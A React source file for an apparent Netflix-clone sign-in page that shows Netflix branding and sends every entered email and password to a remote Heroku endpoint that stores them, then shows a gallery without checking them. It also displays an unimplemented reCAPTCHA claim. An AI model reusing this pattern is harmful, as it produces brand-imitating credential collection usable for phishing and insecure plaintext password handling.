import './login.scss';
import { useState } from 'react';
import Axios from 'axios';
import { createRoot } from 'react-dom/client';
import {
	useNavigate,
	Route,
	Routes,
	Router,
	BrowserRouter,
	Link,
} from 'react-router-dom';
import Gallery from './Gallery';

export default function App() {
	const rootElement = document.getElementById('root');
	const root = createRoot(rootElement);
	const [email, setEmail] = useState('');
	const [password, setPassword] = useState('');

	const [showIt, showingIt] = useState(true);

	const addUser = () => {
		Axios.post('https://netflixclonebackendr2h.herokuapp.com/add', {
			email: email,
			password: password,
		}).then(() => {
			console.log('Table Updated');
		});
		root.render(<Gallery />);
		showingIt(false);
	};

	const navigate = useNavigate();
	// const navigateToGallery = () => {
	// 	// 👇️ navigate to /contacts
	// 	navigate('/Gallery');
	// };

	return (
		<div className='login'>
			<Routes>
				<Route path='/gallery' element={<Gallery />} />
			</Routes>

			<div className='top'>
				<div className='wrapper'>
					<img
						className='logo'
						src='https://upload.wikimedia.org/wikipedia/commons/thumb/0/08/Netflix_2015_logo.svg/2560px-Netflix_2015_logo.svg.png'
						alt=''
					/>
				</div>
			</div>
			<div className='container'>
				{showIt ? (
					<form>
						<h1>Sign In</h1>
						<input
							type='email'
							placeholder='Email or phone number'
							onChange={(e) => {
								setEmail(e.target.value);
							}}
						/>
						<input
							type='password'
							placeholder='Password'
							onChange={(e) => setPassword(e.target.value)}
						/>
						<input
							type='submit'
							value='signin'
							className='loginButton'
							onClick={addUser}
						></input>
						<span>
							New to Netflix? <b>Sign up now.</b>
						</span>
						<small>
							This page is protected by Google reCAPTCHA to ensure you're not a
							bot. <b>Learn more</b>.
						</small>
					</form>
				) : (
					''
				)}
			</div>
		</div>
	);
}
